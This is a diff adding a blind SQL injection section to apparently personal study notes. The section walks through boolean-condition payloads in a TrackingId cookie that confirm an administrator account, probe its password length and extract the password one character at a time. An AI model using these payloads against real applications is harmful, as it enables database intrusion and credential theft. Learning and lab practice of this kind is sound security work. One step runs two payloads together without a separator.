@@ -135,3 +135,33 @@ SELECT column_name FROM information_schema.columns WHERE table_name = 'Users'
 Then select 
 select coulmnname from tablename
 ```
+
+## Blind SQL-Injection:
+
+Even though an application has sql vulnerabilities, it still won’t provide http response from db. Here UNION wont be effective.  How to exploit ?
+
+Let’s say a website is using unique cookie for a user email. In burp when we login and we can see the cookie passing, if the cookie is correct, in response(not http/ui response) we can see some modifications. It might be used to exploit such vulnerabilities.
+
+```sql
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+
+here we can add like :
+TrackingId = 'u5YD3PapBcR4lN3e7Tj4'+AND+'1'='1+--
+```
+
+To find the password we can check each character for the password of a user, lets say there is a table “Users”, column “password”,”username” and one username=”administrator”. Then we can do 
+
+```sql
+TrackingId = 'u5YD3PapBcR4lN3e7Tj4' AND SUBSTRING((SELECT Password FROM Users 
+WHERE Username = 'Administrator'), 1, 1) = 'm
+```
+
+1. `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
+    
+    Verify that the condition is true, confirming that there is a user called `administrator`.
+    
+2. The next step is to determine how many characters are in the password of the `administrator` user. To do this, change the value to:`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`
+    
+    This condition should be true, confirming that the password is greater than 1 character in length.
+    
+3. Send a series of follow-up values to test different password lengths. Send:`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='aTrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a`
